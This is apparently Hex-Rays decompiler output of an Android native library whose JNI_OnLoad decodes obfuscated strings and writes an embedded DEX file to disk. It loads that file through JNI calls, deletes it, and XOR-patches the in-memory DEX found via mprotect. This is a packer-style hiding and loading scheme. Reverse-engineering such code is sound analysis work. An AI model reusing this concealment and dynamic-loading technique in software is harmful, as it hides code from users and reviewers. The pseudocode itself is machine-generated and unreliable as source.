/* This file has been generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2015 Hex-Rays <info@hex-rays.com>

   Detected compiler: GNU C++
*/

#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// int __cdecl __cxa_finalize(_DWORD); weak
// void *malloc(size_t size);
// FILE *fopen(const char *filename, const char *modes);
// char *strstr(const char *haystack, const char *needle);
// char *fgets(char *s, int n, FILE *stream);
// int fclose(FILE *stream);
// __int32 sysconf(int name);
// unsigned __int32 strtoul(const char *nptr, char **endptr, int base);
// int mprotect(void *addr, size_t len, int prot);
// void *dlopen(const char *file, int mode);
// int mkdir(const char *path, __mode_t mode);
// size_t fwrite(const void *ptr, size_t size, size_t n, FILE *s);
// int remove(const char *filename);
// int rmdir(const char *path);
int sub_5C0();
void __noreturn sub_650();
void sub_670();
_BYTE *__cdecl sub_680(int a1, char a2);
signed int sub_710();
int __cdecl sub_950(int a1);
signed int __cdecl JNI_OnLoad(int a1);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_665; // weak
_UNKNOWN unk_15A0; // weak
void *off_4000 = &off_4000; // weak
int dword_4004; // weak
// extern _UNKNOWN _stack_chk_guard; weak


//----- (000005C0) --------------------------------------------------------
int sub_5C0()
{
  return __cxa_finalize(&off_4000);
}
// 4E0: using guessed type int __cdecl __cxa_finalize(_DWORD);
// 4000: using guessed type void *off_4000;

//----- (00000650) --------------------------------------------------------
void __noreturn sub_650()
{
  JUMPOUT(loc_665);
}

//----- (00000670) --------------------------------------------------------
void sub_670()
{
  ;
}

//----- (00000680) --------------------------------------------------------
_BYTE *__cdecl sub_680(int a1, char a2)
{
  _BYTE *v2; // ebp@1
  int v3; // ecx@1
  unsigned int v4; // edx@2

  v2 = malloc(2 * a1 + 1);
  v3 = 0;
  if ( a1 > 0 )
  {
    do
    {
      v4 = *((_DWORD *)&a2 + v3);
      v2[2 * v3] = ~((BYTE1(v4) | ~*(&a2 + 4 * v3)) & (v4 | ~BYTE1(v4)));
      v2[2 * v3++ + 1] = (v4 >> 16) ^ BYTE3(v4);
    }
    while ( v3 != a1 );
  }
  v2[2 * a1] = 0;
  return v2;
}

//----- (00000710) --------------------------------------------------------
signed int sub_710()
{
  const char *v0; // esi@1
  const char *v1; // eax@1
  const char *v2; // eax@3
  signed int result; // eax@5
  __int32 v4; // esi@8
  _BYTE *v5; // eax@8
  void *v6; // edi@8
  int v7; // eax@8
  void *v8; // edx@9
  char *v9; // edi@17
  int v10; // esi@17
  char v11; // al@18
  int v12; // edx@18
  FILE *v13; // [sp+28h] [bp-1C4h]@1
  _BYTE *v14; // [sp+2Ch] [bp-1C0h]@8
  char nptr[4]; // [sp+33h] [bp-1B9h]@8
  int v16; // [sp+37h] [bp-1B5h]@8
  char v17; // [sp+3Bh] [bp-1B1h]@8
  char v18; // [sp+3Ch] [bp-1B0h]@17
  char haystack; // [sp+CCh] [bp-120h]@3
  int v20; // [sp+D0h] [bp-11Ch]@8
  int v21; // [sp+1CCh] [bp-20h]@1

  v21 = _stack_chk_guard;
  v0 = sub_680(1, 114);
  v1 = sub_680(8, 72);
  v13 = fopen(v1, v0);
  if ( v13 )
  {
    do
    {
      if ( !fgets(&haystack, 256, v13) )
        goto LABEL_5;
      v2 = sub_680(3, 101);
    }
    while ( !strstr(&haystack, v2) );
    v17 = 0;
    *(_DWORD *)nptr = *(_DWORD *)&haystack;
    v16 = v20;
    v4 = sysconf(40);
    v5 = (_BYTE *)strtoul(nptr, 0, 16);
    v14 = v5;
    v6 = v5;
    v7 = mprotect(v5, v4 * (1968 / v4 + 8), 7);
    if ( !v7 )
    {
      v8 = v6;
      if ( 8 * v4 > 0 )
      {
        while ( *(_BYTE *)v8 != 100
             || *((_BYTE *)v8 + 1) != 101
             || *((_BYTE *)v8 + 2) != 120
             || *((_BYTE *)v8 + 3) != 10
             || *((_BYTE *)v8 + 4) != 48 )
        {
          ++v7;
          v8 = (char *)v8 + 1;
          if ( v7 == 8 * v4 )
            goto LABEL_5;
        }
        qmemcpy(&v18, &unk_15A0, 0x90u);
        v9 = &v18;
        v10 = v7 - (_DWORD)&v18;
        do
        {
          v11 = *v9;
          v12 = (int)&(v9++)[v10];
          v14[v12 + 1824] = v11 ^ 0x5A;
        }
        while ( v9 != &haystack );
      }
LABEL_5:
      fclose(v13);
      result = 1;
      goto LABEL_6;
    }
  }
  result = 0;
LABEL_6:
  if ( v21 != _stack_chk_guard )
    sub_650();
  return result;
}

//----- (00000950) --------------------------------------------------------
int __cdecl sub_950(int a1)
{
  int (__cdecl *v1)(int, _BYTE *, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int); // edi@1
  _BYTE *v2; // eax@1
  int v3; // edi@1
  int (__cdecl *v4)(int, int, _BYTE *, _BYTE *, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int); // ebp@1
  _BYTE *v5; // ST3C_4@1
  _BYTE *v6; // eax@1
  int v7; // eax@1

  v1 = *(int (__cdecl **)(int, _BYTE *, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int))(*(_DWORD *)a1 + 24);
  v2 = sub_680(11, 101);
  v3 = v1(
         a1,
         v2,
         258873185,
         57610016,
         191174518,
         253760882,
         157625965,
         443090276,
         560793205,
         157830944,
         73466213,
         774768244);
  v4 = *(int (__cdecl **)(int, int, _BYTE *, _BYTE *, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int))(*(_DWORD *)a1 + 452);
  v5 = sub_680(13, 97);
  v6 = sub_680(10, 32);
  v7 = v4(
         a1,
         v3,
         v6,
         v5,
         393352039,
         644155493,
         1092616814,
         375718768,
         527449200,
         376570981,
         1377847596,
         23401844,
         392498030,
         774791012);
  return (*(int (__cdecl **)(int, int, int))(*(_DWORD *)a1 + 456))(a1, v3, v7);
}

//----- (00000AE0) --------------------------------------------------------
signed int __cdecl JNI_OnLoad(int a1)
{
  const char *v1; // eax@2
  int (__cdecl *v2)(int, _BYTE *, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int); // esi@3
  _BYTE *v3; // eax@3
  const char *v4; // eax@4
  FILE *v5; // eax@4
  FILE *v6; // esi@4
  int (__cdecl *v7)(int, _BYTE *, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int); // esi@5
  _BYTE *v8; // eax@5
  int v9; // esi@5
  int (__cdecl *v10)(int, int, _BYTE *, _BYTE *, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int); // edi@5
  _BYTE *v11; // ebp@5
  _BYTE *v12; // eax@5
  int v13; // ebp@5
  int v14; // STBC_4@5
  int v15; // STB8_4@5
  int (__cdecl *v16)(int, int, int, int, int, _DWORD, int); // edi@5
  int v17; // eax@5
  int v18; // edi@5
  int (__cdecl *v19)(int, int, _BYTE *, _BYTE *, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int); // ebp@5
  _BYTE *v20; // STB8_4@5
  _BYTE *v21; // eax@5
  int v22; // esi@5
  int v23; // eax@5
  int (__cdecl *v24)(int, int, _BYTE *, _BYTE *, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int); // esi@5
  _BYTE *v25; // edi@5
  _BYTE *v26; // eax@5
  int v27; // esi@5
  int (__cdecl *v28)(int, int, _BYTE *, _BYTE *, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int); // edi@5
  _BYTE *v29; // ebp@5
  _BYTE *v30; // eax@5
  int v31; // eax@5
  int v32; // eax@5
  signed int result; // eax@6
  char *path; // [sp+A4h] [bp-48h]@1
  char *filename; // [sp+A8h] [bp-44h]@1
  int v36; // [sp+ACh] [bp-40h]@3
  char *v37; // [sp+B0h] [bp-3Ch]@1
  _BYTE *v38; // [sp+B4h] [bp-38h]@1
  int v39; // [sp+CCh] [bp-20h]@5

  filename = sub_680(21, 32);
  path = sub_680(21, 100);
  v37 = sub_680(24, 110);
  v38 = sub_680(11, 32);
  if ( !(*(int (__cdecl **)(int, int *, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int))(*(_DWORD *)a1 + 24))(
          a1,
          &dword_4004,
          65542,
          124257379,
          393216111,
          6626416,
          1126189924,
          158269556,
          123814509,
          7281524,
          1551040869,
          539000620,
          527109231,
          1214662176,
          494012783,
          90263328,
          6688544,
          460786789,
          510477600,
          24004201,
          292819317,
          1551048037,
          236997166,
          292829011,
          1920078185)
    && (v1 = sub_680(5, 103), dlopen(v1, 0))
    && (mkdir(path, 0x1C0u),
        v2 = *(int (__cdecl **)(int, _BYTE *, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int))(*(_DWORD *)dword_4004 + 24),
        v3 = sub_680(16, 100),
        (v36 = v2(
                 dword_4004,
                 v3,
                 1081022836,
                 241240685,
                 141499252,
                 359681056,
                 275992161,
                 56950900,
                 1176502574,
                 174406739,
                 1551041889,
                 23996783,
                 326586144,
                 393488489,
                 1226841192,
                 140576368,
                 192021616)) != 0)
    && (v4 = sub_680(1, 105), v5 = fopen(filename, v4), (v6 = v5) != 0)
    && (fwrite("dex\n035", 0x15A8u, 1u, v5),
        fclose(v6),
        v7 = *(int (__cdecl **)(int, _BYTE *, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int))(*(_DWORD *)dword_4004 + 24),
        v8 = sub_680(14, 97),
        v9 = v7(
               dword_4004,
               v8,
               358829088,
               40436072,
               443106156,
               57694496,
               309795695,
               1248135524,
               1227634290,
               543381536,
               410586465,
               493753957,
               174400110,
               342901024,
               40894565),
        v10 = *(int (__cdecl **)(int, int, _BYTE *, _BYTE *, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int))(*(_DWORD *)dword_4004 + 132),
        v11 = sub_680(40, 97),
        v12 = sub_680(3, 112),
        v13 = v10(
                dword_4004,
                v9,
                v12,
                v11,
                510804079,
                157746277,
                1097729633,
                1479294063,
                140595744,
                56885358,
                1013979936,
                326241121,
                225183091,
                360270437,
                1310740270,
                1534342227,
                108149353,
                6902304,
                1193279598,
                761350259,
                359925356,
                6379040,
                140788078,
                510673184,
                1601176165,
                291840880,
                1194197106,
                625102368,
                627657074,
                107414638,
                359945760,
                1277182063,
                1310720097,
                1081017698,
                7088745,
                477053216,
                694486390,
                1092623730,
                208211048,
                1399330151,
                1047005472),
        v14 = (*(int (__cdecl **)(int, char *))(*(_DWORD *)dword_4004 + 668))(dword_4004, filename),
        v15 = (*(int (__cdecl **)(int, char *))(*(_DWORD *)dword_4004 + 668))(dword_4004, path),
        v16 = *(int (__cdecl **)(int, int, int, int, int, _DWORD, int))(*(_DWORD *)dword_4004 + 112),
        v17 = sub_950(dword_4004),
        v18 = v16(dword_4004, v9, v13, v14, v15, 0, v17),
        v19 = *(int (__cdecl **)(int, int, _BYTE *, _BYTE *, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int))(*(_DWORD *)dword_4004 + 132),
        v20 = sub_680(19, 101),
        v21 = sub_680(5, 101),
        v22 = v19(
                dword_4004,
                v9,
                v21,
                v20,
                392430693,
                1667434101,
                1248135789,
                493434724,
                74254197,
                191647264,
                1584878703,
                1243636270,
                426713667,
                1248139126,
                1294737010,
                107040288,
                660881774,
                309546016,
                510466665,
                1701140077),
        v23 = (*(int (__cdecl **)(int, _BYTE *))(*(_DWORD *)dword_4004 + 668))(dword_4004, v38),
        v39 = (*(int (__cdecl **)(int, int, int, int))(*(_DWORD *)dword_4004 + 136))(dword_4004, v18, v22, v23),
        v24 = *(int (__cdecl **)(int, int, _BYTE *, _BYTE *, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int))(*(_DWORD *)dword_4004 + 132),
        v25 = sub_680(13, 57),
        v26 = sub_680(3, 112),
        v27 = v24(
                dword_4004,
                v39,
                v26,
                v25,
                494148213,
                1551040869,
                1344294188,
                1534329715,
                292694121,
                6882930,
                241637486,
                376394784,
                1248024675,
                1936930657),
        remove(filename),
        remove(v37),
        rmdir(path),
        v28 = *(int (__cdecl **)(int, int, _BYTE *, _BYTE *, signed int, signed int, signed int, signed int, signed int, signed int, signed int, signed int))(*(_DWORD *)dword_4004 + 576),
        v29 = sub_680(11, 32),
        v30 = sub_680(4, 105),
        v31 = v28(
                dword_4004,
                v36,
                v30,
                v29,
                1462635897,
                174788384,
                342104425,
                610615662,
                1411390073,
                325389154,
                443418721,
                388762227),
        v32 = (*(int (__cdecl **)(int, int, int))(*(_DWORD *)dword_4004 + 580))(dword_4004, v36, v31),
        (*(void (__cdecl **)(int, int, int, int))(*(_DWORD *)dword_4004 + 112))(dword_4004, v39, v27, v32),
        sub_710()) )
  {
    result = 65542;
  }
  else
  {
    result = -1;
  }
  return result;
}
// 4004: using guessed type int dword_4004;

// ALL OK, 7 function(s) have been successfully decompiled
